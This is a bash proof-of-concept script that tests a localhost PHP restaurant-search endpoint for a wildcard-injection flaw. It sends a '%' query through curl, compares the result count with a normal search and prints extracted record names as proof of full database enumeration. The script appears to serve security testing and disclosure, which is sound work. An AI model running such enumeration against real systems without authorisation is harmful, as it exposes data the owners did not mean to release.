#!/bin/bash

# POC: Unrestricted Wildcard Query Allows Full Database Enumeration
# Vulnerability: search_restaurants.php uses unescaped LIKE queries with user input
# Impact: Attacker can enumerate entire database by using % wildcard

TARGET_URL="http://localhost:8080/api/search_restaurants.php"

echo "=== SQL Wildcard Query Enumeration POC ==="
echo ""

# Test 1: Normal search (expected behavior - limited results)
echo "[*] Test 1: Normal search with specific query (expected behavior)"
echo "Query: 'italian'"
RESPONSE_NORMAL=$(curl -s "${TARGET_URL}?query=italian")
NORMAL_COUNT=$(echo "$RESPONSE_NORMAL" | grep -o '"id"' | wc -l)
echo "Response count: $NORMAL_COUNT restaurants"
echo "Sample: $(echo "$RESPONSE_NORMAL" | head -c 200)..."
echo ""

# Test 2: Wildcard enumeration (vulnerability - all results)
echo "[*] Test 2: Wildcard query enumeration (VULNERABLE)"
echo "Query: '%' (SQL wildcard character)"
RESPONSE_WILDCARD=$(curl -s "${TARGET_URL}?query=%")
WILDCARD_COUNT=$(echo "$RESPONSE_WILDCARD" | grep -o '"id"' | wc -l)
echo "Response count: $WILDCARD_COUNT restaurants"
echo ""

# Test 3: Verify enumeration bypasses filtering
echo "[*] Test 3: Analysis"
if [ "$WILDCARD_COUNT" -gt "$NORMAL_COUNT" ]; then
    echo "✓ VULNERABILITY CONFIRMED: Wildcard returns $WILDCARD_COUNT records vs $NORMAL_COUNT for normal search"
    echo "✓ Full database enumeration is possible using the % character"
    echo ""
    
    # Show all records returned
    echo "[*] Full enumeration results:"
    echo "$RESPONSE_WILDCARD" | grep -o '"name":"[^"]*"' | head -10
    echo ""
    echo "Proof: All restaurant records can be extracted with a single query using '%'"
    exit 0
else
    echo "✗ Could not confirm wildcard enumeration"
    echo "Response: $RESPONSE_WILDCARD"
    exit 1
fi